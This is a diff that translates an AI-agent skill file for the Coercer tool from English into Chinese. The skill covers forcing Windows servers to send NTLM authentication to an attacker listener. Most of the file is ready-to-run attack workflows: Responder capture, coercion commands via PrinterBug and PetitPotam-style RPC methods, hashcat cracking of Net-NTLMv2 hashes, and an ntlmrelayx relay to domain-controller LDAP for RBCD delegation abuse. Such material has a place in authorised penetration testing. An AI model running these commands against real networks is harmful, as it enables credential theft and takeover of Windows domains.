@@ -1,25 +1,23 @@
 ---
 name: coercer
 description: >
-  This skill should be used when the user asks about "coercer", "coerce NTLM
-  authentication from a Windows server", "set up an NTLM relay via Responder",
-  "exploit printspooler/PetitPotam-style auth coercion". Coercer forces
-  Windows servers to authenticate to a controlled host by abusing MS-RPRN,
-  MS-EFSR, MS-DFSNM, and other RPC protocols, enabling NTLM relay or hash
-  capture.
+  此技能适用于用户询问关于"coercer"、"从 Windows 服务器强制 NTLM 认证"、
+  "通过 Responder 设置 NTLM 中继"、"利用 printspooler/PetitPotam 风格的认证强制"等问题。
+  Coercer 通过滥用 MS-RPRN、MS-EFSR、MS-DFSNM 等 RPC 协议，强制 Windows 服务器向受控主机进行认证，
+  从而实现 NTLM 中继或哈希捕获。
 ---
 
 # Coercer
 
-Force Windows servers to authenticate (NTLM) to your listener — enables relay, capture, and hash extraction.
+强制 Windows 服务器向监听器进行 NTLM 认证——实现中继、捕获和哈希提取。
 
-## Concept
+## 原理
 
-Coercer abuses multiple RPC protocols/methods that trigger a Windows host to initiate an outbound NTLM authentication to an attacker-controlled IP. The captured Net-NTLMv2 hash can be:
-- **Cracked offline** (Hashcat/John)
-- **Relayed** in real-time (ntlmrelayx) to access other systems
+Coercer 滥用多种 RPC 协议/方法，触发 Windows 主机向攻击者控制的 IP 发起出站 NTLM 认证。捕获到的 Net-NTLMv2 哈希可以：
+- **离线破解**（Hashcat/John）
+- **实时中继**（ntlmrelayx）以访问其他系统
 
-## Quick Start
+## 快速开始
 
 ```bash
 # Coerce auth from a server, capture with Responder
@@ -30,31 +28,31 @@ responder -I eth0 -wv
 coercer coerce -l 10.10.14.1 -t 10.10.10.10 -u user -p password -d domain.local
 ```
 
-## Sub-commands
+## 子命令
 
-| Command | Description |
+| 命令 | 描述 |
 |---------|-------------|
-| `coerce` | Trigger authentication coercion |
-| `scan` | Scan target for available coercion methods |
-| `fuzz` | Fuzz available RPC methods |
+| `coerce` | 触发认证强制 |
+| `scan` | 扫描目标可用的强制方法 |
+| `fuzz` | 模糊测试可用的 RPC 方法 |
 
-## Core Flags
+## 核心参数
 
-| Flag | Description |
+| 参数 | 描述 |
 |------|-------------|
-| `-l <ip>` | Listener IP (attacker machine) |
-| `-t <ip>` | Target IP (Windows server to coerce) |
-| `-u <user>` | Username for auth to target |
-| `-p <pass>` | Password |
-| `-d <domain>` | Domain |
-| `-H <hash>` | NTLM hash |
-| `--filter-protocol-name <name>` | Only use specific protocol (e.g., `MS-RPRN`) |
-| `--filter-method-name <name>` | Specific RPC method |
-| `--always-continue` | Continue despite errors |
+| `-l <ip>` | 监听器 IP（攻击者机器） |
+| `-t <ip>` | 目标 IP（被强制的 Windows 服务器） |
+| `-u <user>` | 认证目标的用户名 |
+| `-p <pass>` | 密码 |
+| `-d <domain>` | 域名 |
+| `-H <hash>` | NTLM 哈希 |
+| `--filter-protocol-name <name>` | 仅使用特定协议（如 `MS-RPRN`） |
+| `--filter-method-name <name>` | 指定 RPC 方法 |
+| `--always-continue` | 出错时继续执行 |
 
-## Supported Protocols
+## 支持的协议
 
-| Protocol | Common Name |
+| 协议 | 常见名称 |
 |----------|-------------|
 | `MS-RPRN` | PrinterBug / SpoolSample |
 | `MS-EFSR` | PetitPotam |
@@ -62,9 +60,9 @@ coercer coerce -l 10.10.14.1 -t 10.10.10.10 -u user -p password -d domain.local
 | `MS-FSRVP` | ShadowCoerce |
 | `MS-EVEN6` | EventLog |
 
-## Attack Workflows
+## 攻击工作流程
 
-### Capture Net-NTLMv2 Hash
+### 捕获 Net-NTLMv2 哈希
 
 ```bash
 # 1. Start Responder
@@ -77,7 +75,7 @@ coercer coerce -l 10.10.14.1 -t 10.10.10.10 -u user -p pass -d corp.local
 hashcat -a 0 -m 5600 hash.txt rockyou.txt
 ```
 
-### NTLM Relay to LDAP (for S4U2Self / RBCD)
+### NTLM 中继到 LDAP（用于 S4U2Self / RBCD）
 
 ```bash
 # 1. Start ntlmrelayx targeting DC LDAP
@@ -87,16 +85,14 @@ ntlmrelayx.py -t ldap://dc.corp.local --delegate-access -smb2support
 coercer coerce -l 10.10.14.1 -t dc.corp.local -u user -p pass -d corp.local
 ```
 
-### Scan Available Methods
+### 扫描可用方法
 
 ```bash
 coercer scan -t 10.10.10.10 -u user -p pass -d corp.local
 ```
 
-## Resources
+## 参考资源
 
-| File | When to load |
+| 文件 | 加载时机 |
 |------|--------------|
-| `references/ntlm-relay.md` | Full relay chain setup, ntlmrelayx options, RBCD exploitation |
-
-## Structuring This Skill
+| `references/ntlm-relay.md` | 完整中继链设置、ntlmrelayx 选项、RBCD 利用 |
